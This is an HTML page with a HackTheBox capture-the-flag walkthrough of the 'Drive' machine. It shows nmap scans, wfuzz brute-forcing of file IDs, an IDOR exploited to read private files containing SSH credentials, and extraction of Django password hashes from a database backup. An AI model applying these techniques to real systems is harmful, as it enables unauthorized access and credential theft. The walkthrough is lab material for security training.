@@ -1,0 +1,921 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Drive - HTB</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/writeups.css">
+    <link rel="stylesheet" href="/monokai.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="writeup-content">
+        <div class="container">
+            <div class="writeup-panel">
+                <img src="/writeups/htb/hard/drive/img/drive.png" alt="Machine Icon" class="machine-icon-circle">
+                <h2>Drive - HTB</h2>
+                <p>walkthrough by elswix<p>
+                <ul class="machine-links">
+                    <li><a href="https://app.hackthebox.com/machines/Drive">HackTheBox</a></li>
+                </ul>
+            </div>
+            <div class="writeup-content-main">
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Drive</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Hard</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">10</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2023</span>
+</pre></div>
+<h3>About Drive</h3><br/>
+<p>Drive is a hard-difficulty machine on HackTheBox. Initially, we exploit an IDOR (Insecure Direct Object Reference) vulnerability to access private messages, revealing SSH credentials.</p><br/>
+<h3>Shell as martin</h3><br/>
+<p>Utilizing these credentials, we establish access as <code>martin</code> on the target system through SSH.</p><br/>
+<h3>Shell as tom</h3><br/>
+<p>As <code>martin</code>, we discover an HTTP service running on port <code>3000</code>, identified as a Gitea service. Reusing our credentials, we log in as <code>martinCruz</code>. Under this account, we access the source code of the main website, uncovering credentials for compressed files containing databases. These databases store user credentials, and we obtain a valid password for Tom.</p><br/>
+<h3>Shell as root</h3><br/>
+<p>Switching to the <code>tom</code> account, we identify a Set-UID file susceptible to Buffer Overflow. Bypassing certain protections, we successfully leverage this vulnerability to gain root access.</p><br/>
+<h3>Recon</h3><br/>
+<p>As always, we will conduct a port scan to discover open ports on the victim machine. To do this, I will utilize <code>nmap</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="mf">10.10.11.235</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.235</span> <span class="p">(</span><span class="mf">10.10.11.235</span><span class="p">)</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.14</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">57914</span> <span class="n">closed</span> <span class="n">ports</span><span class="p">,</span> <span class="mi">7619</span> <span class="n">filtered</span> <span class="n">ports</span>
+<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>
+</pre></div>
+<p>Once the scan is complete, we will perform a thorough scan to identify technologies running on these ports.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10.11.235</span>
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.235</span> <span class="p">(</span><span class="mf">10.10.11.235</span><span class="p">)</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.2</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="mf">.9</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">drive</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+
+<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
+<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">19.56</span> <span class="n">seconds</span>
+</pre></div>
+<p>At first glance, we can see that there is an HTTP service and an SSH service running on ports 22 and 80, respectively. We can highlight a domain: <code>drive.htb</code>.</p><br/>
+<p>Let's try to ping the <code>drive.htb</code> domain:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ping</span> <span class="o">-</span><span class="n">c</span> <span class="mi">1</span> <span class="n">drive</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">ping</span><span class="p">:</span> <span class="n">drive</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span> <span class="n">Name</span> <span class="ow">or</span> <span class="n">service</span> <span class="ow">not</span> <span class="n">known</span>
+</pre></div>
+<p>It throws an unknown name or service error. This is because it is not a registered domain. To enable the resolution of this domain, we have to add it to our <code>hosts</code> file and make it point to the IP address of the victim.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">ubuntu</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">fe00</span><span class="p">::</span><span class="mi">0</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localnet</span>
+<span class="n">ff00</span><span class="p">::</span><span class="mi">0</span> <span class="n">ip6</span><span class="o">-</span><span class="n">mcastprefix</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="c1"># HackTheBox</span>
+<span class="mf">10.10.11.235</span> <span class="n">drive</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+<p>Now, let's attempt to ping the domain again:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ping</span> <span class="o">-</span><span class="n">c</span> <span class="mi">1</span> <span class="n">drive</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">PING</span> <span class="n">drive</span><span class="o">.</span><span class="n">htb</span> <span class="p">(</span><span class="mf">10.10.11.235</span><span class="p">)</span> <span class="mi">56</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span> <span class="nb">bytes</span> <span class="n">of</span> <span class="n">data</span><span class="o">.</span>
+<span class="mi">64</span> <span class="nb">bytes</span> <span class="kn">from</span> <span class="nn">drive.htb</span> <span class="p">(</span><span class="mf">10.10.11.235</span><span class="p">):</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">63</span> <span class="n">time</span><span class="o">=</span><span class="mi">143</span> <span class="n">ms</span>
+
+<span class="o">---</span> <span class="n">drive</span><span class="o">.</span><span class="n">htb</span> <span class="n">ping</span> <span class="n">statistics</span> <span class="o">---</span>
+<span class="mi">1</span> <span class="n">packets</span> <span class="n">transmitted</span><span class="p">,</span> <span class="mi">1</span> <span class="n">received</span><span class="p">,</span> <span class="mi">0</span><span class="o">%</span> <span class="n">packet</span> <span class="n">loss</span><span class="p">,</span> <span class="n">time</span> <span class="mi">0</span><span class="n">ms</span>
+<span class="n">rtt</span> <span class="nb">min</span><span class="o">/</span><span class="n">avg</span><span class="o">/</span><span class="nb">max</span><span class="o">/</span><span class="n">mdev</span> <span class="o">=</span> <span class="mf">143.496</span><span class="o">/</span><span class="mf">143.496</span><span class="o">/</span><span class="mf">143.496</span><span class="o">/</span><span class="mf">0.000</span> <span class="n">ms</span>
+</pre></div>
+<p>As you can see, it is resolving to the IP address of the victim machine.</p><br/>
+<h3>HTTP Service - Port 80</h3><br/>
+<p>When accessing the website through our browser, we will see the following content:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/1.png"/></p><br/>
+<p>The purpose of this website is to upload and share files.</p><br/>
+<p>There is a login section:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/2.png"/></p><br/>
+<p>There is also a registration section:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/3.png"/></p><br/>
+<p>In the login section, I attempted some common credentials like <code>admin:admin</code> or <code>guest:guest</code>, but they did not work.</p><br/>
+<p>Let's register a new account:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/5.png"/></p><br/>
+<p>Once registered, you will be prompted to log in:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/6.png"/></p><br/>
+<p>There is a <code>dashboard</code> section:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/7.png"/></p><br/>
+<p>There is an uploaded file named <code>Welcome_to_Doodle_Grive</code> uploaded by the admin user. Note that the group says "public," so there may be private files as well.</p><br/>
+<p>When clicking on the filename, it redirects to <code>/100/getFileDetail/</code>:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/8.png"/></p><br/>
+<p>When clicking on <code>Just View</code>, we can see the content of the file displayed:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/9.png"/></p><br/>
+<p>It's a welcome message, not relevant at the moment.</p><br/>
+<p>There is an <code>upload</code> section:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/10.png"/></p><br/>
+<p>Let's try to upload a simple file:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/11.png"/></p><br/>
+<p>As you can see, it allows you to select groups that can view the uploaded file. It currently displays only the 'public' group, but perhaps we can create our custom ones.</p><br/>
+<p>I selected the <code>public</code> group and uploaded the file:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/12.png"/></p><br/>
+<p>When clicking on <code>Reserve</code>, it makes a GET request to <code>/112/block/</code>:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/14.png"/></p><br/>
+<p>I have noticed that "reserving" a file makes it impossible for anyone to modify the contents of the file. You can "unreserve" files in the <code>/unblockFile/</code> section:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/15.png"/></p><br/>
+<p>When clicking on the name of the file, it redirects to <code>/112/getFileDetail/</code>:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/13.png"/></p><br/>
+<p>When looking at the URL, you may have noticed that there is a number that functions as an ID. It may be interesting to apply brute force on this number.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">wfuzz</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">z</span> <span class="nb">range</span><span class="p">,</span><span class="mi">1</span><span class="o">-</span><span class="mi">500</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">500</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Cookie: csrftoken=gb9lGbLjxaWJFxbgPZvymLCmDUhPjtap; sessionid=kwjwl8efgnpbpxl84nf3017fz6vfao9i"</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">drive</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">FUZZ</span><span class="o">/</span><span class="n">getFileDetail</span><span class="o">/</span>
+<span class="o">********************************************************</span>
+<span class="o">*</span> <span class="n">Wfuzz</span> <span class="mf">3.1.0</span> <span class="o">-</span> <span class="n">The</span> <span class="n">Web</span> <span class="n">Fuzzer</span>                         <span class="o">*</span>
+<span class="o">********************************************************</span>
+
+<span class="n">Target</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">drive</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">FUZZ</span><span class="o">/</span><span class="n">getFileDetail</span><span class="o">/</span>
+<span class="n">Total</span> <span class="n">requests</span><span class="p">:</span> <span class="mi">500</span>
+
+<span class="o">=====================================================================</span>
+<span class="n">ID</span>           <span class="n">Response</span>   <span class="n">Lines</span>    <span class="n">Word</span>       <span class="n">Chars</span>       <span class="n">Payload</span>                 
+<span class="o">=====================================================================</span>
+
+<span class="mi">000000079</span><span class="p">:</span>   <span class="mi">401</span>        <span class="mi">0</span> <span class="n">L</span>      <span class="mi">2</span> <span class="n">W</span>        <span class="mi">26</span> <span class="n">Ch</span>       <span class="s2">"79"</span>                    
+<span class="mi">000000098</span><span class="p">:</span>   <span class="mi">401</span>        <span class="mi">0</span> <span class="n">L</span>      <span class="mi">2</span> <span class="n">W</span>        <span class="mi">26</span> <span class="n">Ch</span>       <span class="s2">"98"</span>                    
+<span class="mi">000000099</span><span class="p">:</span>   <span class="mi">401</span>        <span class="mi">0</span> <span class="n">L</span>      <span class="mi">2</span> <span class="n">W</span>        <span class="mi">26</span> <span class="n">Ch</span>       <span class="s2">"99"</span>                    
+<span class="mi">000000101</span><span class="p">:</span>   <span class="mi">401</span>        <span class="mi">0</span> <span class="n">L</span>      <span class="mi">2</span> <span class="n">W</span>        <span class="mi">26</span> <span class="n">Ch</span>       <span class="s2">"101"</span>                   
+<span class="mi">000000100</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">171</span> <span class="n">L</span>    <span class="mi">376</span> <span class="n">W</span>      <span class="mi">5078</span> <span class="n">Ch</span>     <span class="s2">"100"</span>                   
+<span class="mi">000000112</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">165</span> <span class="n">L</span>    <span class="mi">343</span> <span class="n">W</span>      <span class="mi">4779</span> <span class="n">Ch</span>     <span class="s2">"112"</span>                   
+
+<span class="n">Total</span> <span class="n">time</span><span class="p">:</span> <span class="mf">14.26144</span>
+<span class="n">Processed</span> <span class="n">Requests</span><span class="p">:</span> <span class="mi">500</span>
+<span class="n">Filtered</span> <span class="n">Requests</span><span class="p">:</span> <span class="mi">494</span>
+<span class="n">Requests</span><span class="o">/</span><span class="n">sec</span><span class="o">.</span><span class="p">:</span> <span class="mf">35.05956</span>
+</pre></div>
+<p>It returned an interesting response; some files are returning a 401 status code. As we've observed, the ID <code>100</code> corresponds to the welcome message file, while <code>112</code> corresponds to our uploaded file.</p><br/>
+<p>I believe that the IDs returning a 401 status code correspond to private files and are inaccessible without privileged authentication.</p><br/>
+<h3>Insecure Direct Object Reference (IDOR)</h3><br/>
+<p>Accessing these files through <code>/getFileDetail/</code> results in a 401 status code. As we observed earlier, when 'reserving' a file, a request is made to <code>/{File ID}/block</code>. Let's explore what happens when we attempt to block these "private" files. First, let's try to "reserve" the file with the ID <code>101</code>:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/16.png"/></p><br/>
+<p>As we can see, we successfully gained access to the file. Clicking on 'Just View' allows us to retrieve the file content:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/17.png"/></p><br/>
+<p>It mentions something about database backups and compressed files with a strong password. But at this moment, it is useless until we gain access to the system.</p><br/>
+<h3>Shell as martin</h3><br/>
+<p>I went through this process for each file, and the file with the ID <code>79</code> had particularly interesting content:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/18.png"/></p><br/>
+<p>It reveals a username and a password. These credentials can be useful for SSH access.</p><br/>
+<p>Trying these credentials through SSH was successful! We now have access to the system as <code>martin</code>.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ssh</span> <span class="n">martin</span><span class="o">@</span><span class="mf">10.10.11.235</span>
+<span class="n">martin</span><span class="o">@</span><span class="mf">10.10.11.235</span><span class="s1">'s password: </span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="nd">martin@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>Martin does not have sudo privileges on drive:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">martin@drive</span><span class="p">:</span><span class="o">~$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">martin</span><span class="p">:</span> 
+<span class="n">Sorry</span><span class="p">,</span> <span class="n">user</span> <span class="n">martin</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">run</span> <span class="n">sudo</span> <span class="n">on</span> <span class="n">drive</span><span class="o">.</span>
+<span class="nd">martin@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>Martin doesn't belong to any interesting groups either:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">martin@drive</span><span class="p">:</span><span class="o">~$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">martin</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">martin</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">martin</span><span class="p">)</span>
+<span class="nd">martin@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>There are no interesting Set-UID files.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">martin@drive</span><span class="p">:</span><span class="o">~$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">policykit</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="n">polkit</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">helper</span><span class="o">-</span><span class="mi">1</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">eject</span><span class="o">/</span><span class="n">dmcrypt</span><span class="o">-</span><span class="n">get</span><span class="o">-</span><span class="n">device</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">passwd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chfn</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chsh</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">at</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">newgrp</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sudo</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">umount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">su</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">gpasswd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">fusermount</span>
+<span class="nd">martin@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>Recalling the message, it mentioned database backups in <code>/var/www/backups</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">martin@drive</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www$</span> <span class="n">cd</span> <span class="n">backups</span><span class="o">/</span>
+<span class="nd">martin@drive</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups$</span> <span class="n">ls</span>
+<span class="mi">1</span><span class="n">_Dec_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="mf">.7</span><span class="n">z</span>  <span class="mi">1</span><span class="n">_Oct_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="mf">.7</span><span class="n">z</span>  <span class="n">db</span><span class="o">.</span><span class="n">sqlite3</span>
+<span class="mi">1</span><span class="n">_Nov_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="mf">.7</span><span class="n">z</span>  <span class="mi">1</span><span class="n">_Sep_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="mf">.7</span><span class="n">z</span>
+<span class="nd">martin@drive</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups$</span>
+</pre></div>
+<p>The compressed files are protected by a strong password and are uncrackable (I've already tried). However, we can inspect the <code>db.sqlite3</code> file, as it isn't compressed:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">martin@drive</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups$</span> <span class="n">sqlite3</span> <span class="o">./</span><span class="n">db</span><span class="o">.</span><span class="n">sqlite3</span> 
+<span class="n">SQLite</span> <span class="n">version</span> <span class="mf">3.31.1</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">27</span> <span class="mi">19</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">54</span>
+<span class="n">Enter</span> <span class="s2">".help"</span> <span class="k">for</span> <span class="n">usage</span> <span class="n">hints</span><span class="o">.</span>
+<span class="n">sqlite</span><span class="o">&gt;</span>
+</pre></div>
+<p>To enumerate existing tables we can use the <code>.tables</code> command:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">sqlite</span><span class="o">&gt;</span> <span class="o">.</span><span class="n">tables</span>
+<span class="n">accounts_customuser</span>                   <span class="n">auth_permission</span>                     
+<span class="n">accounts_customuser_groups</span>            <span class="n">django_admin_log</span>                    
+<span class="n">accounts_customuser_user_permissions</span>  <span class="n">django_content_type</span>                 
+<span class="n">accounts_g</span>                            <span class="n">django_migrations</span>                   
+<span class="n">accounts_g_users</span>                      <span class="n">django_session</span>                      
+<span class="n">auth_group</span>                            <span class="n">myApp_file</span>                          
+<span class="n">auth_group_permissions</span>                <span class="n">myApp_file_groups</span>                   
+<span class="n">sqlite</span><span class="o">&gt;</span>
+</pre></div>
+<p>These table names seem to be related to the Django framework. The most interesting table here is <code>accounts_customuser</code>; it contains credentials:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">sqlite</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="kn">from</span> <span class="nn">accounts_customuser</span><span class="p">;</span>
+<span class="mi">21</span><span class="o">|</span><span class="n">sha1</span><span class="err">$</span><span class="n">W5IGzMqPgAUGMKXwKRmi08</span><span class="err">$</span><span class="mi">030814</span><span class="n">d90a6a50ac29bb48e0954a89132302483a</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span> <span class="mi">05</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mf">27.497873</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="n">jamesMason</span><span class="o">|||</span><span class="n">jamesMason</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">04</span>
+<span class="mi">22</span><span class="o">|</span><span class="n">sha1</span><span class="err">$</span><span class="n">E9cadw34Gx4E59Qt18NLXR</span><span class="err">$</span><span class="mi">60919</span><span class="n">b923803c52057c0cdd1d58f0409e7212e9f</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span> <span class="mi">12</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">10</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="n">martinCruz</span><span class="o">|||</span><span class="n">martin</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">02</span>
+<span class="mi">23</span><span class="o">|</span><span class="n">sha1</span><span class="err">$</span><span class="n">kyvDtANaFByRUMNSXhjvMc</span><span class="err">$</span><span class="mf">9e77</span><span class="n">fb56c31e7ff032f8deb1f0b5e8f42e9e3004</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span> <span class="mi">13</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">45</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="n">tomHands</span><span class="o">|||</span><span class="n">tom</span><span class="nd">@drive</span><span class="o">.</span><span class="n">htb</span><span class="o">|</span><span class="mi">0</span><span class="o">|</span><span class="mi">1</span><span class="o">|</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">45</span>
